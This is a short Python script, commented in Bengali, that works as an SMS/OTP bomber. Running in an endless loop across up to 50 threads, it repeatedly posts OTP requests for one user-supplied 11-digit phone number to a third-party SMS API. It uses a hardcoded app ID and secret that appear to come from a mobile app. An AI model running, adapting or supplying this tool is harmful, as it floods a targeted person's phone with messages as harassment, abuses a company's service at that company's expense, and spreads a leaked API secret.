import requests
import json
from concurrent.futures import ThreadPoolExecutor

# মোট রিকোয়েস্ট কাউন্টার
total_requests = 0

def send_otp(phone_no):
    """
    OTP শ্যুট করার ফাংশন।
    """
    global total_requests

    url = "https://sms.retaildataservice.com/api/v1/otp/request-otp"
    headers = {
        "Content-Type": "application/json"
    }
    data = {
        "appID": "im-dexter-android",
        "appSecret": "1dS231fD5F67s!8D9f6F5#4d3s2F2G2sG@2dfDg7E5sdR#4fYH7s89d9fH9@s4Jdf3Js6Sd!f8sSdG5Gf",
        "phoneNo": phone_no
    }

    try:
        response = requests.post(url, headers=headers, data=json.dumps(data))
        if response.status_code == 200 and "success" in response.text.lower():
            total_requests += 1
            print(f"[api_9] [{total_requests}] OTP sent successfully for {phone_no}.")
        else:
            print(f"[api_9] Failed to send OTP for {phone_no}. Response: {response.text}")
    except Exception as e:
        print(f"[api_9] Error in sending OTP for {phone_no}: {e}")

def main(mobile, threads):
    """
    প্রধান ফাংশন: একাধিক থ্রেডে OTP শ্যুট করা।
    """
    # মোবাইল নম্বর যাচাই করা (১১ ডিজিটের)
    if len(mobile) != 11 or not mobile.isdigit():
        print("Invalid phone number format. Please provide an 11-digit phone number.")
        return

    # মাল্টিথ্রেডিং দিয়ে OTP শ্যুট করা
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(send_otp, mobile) for _ in range(threads)]
            for future in futures:
                future.result()

if __name__ == "__main__":
    mobile = input("Enter an 11-digit phone number: ")
    threads = int(input("Threads(1-50): "))
    main(mobile, threads)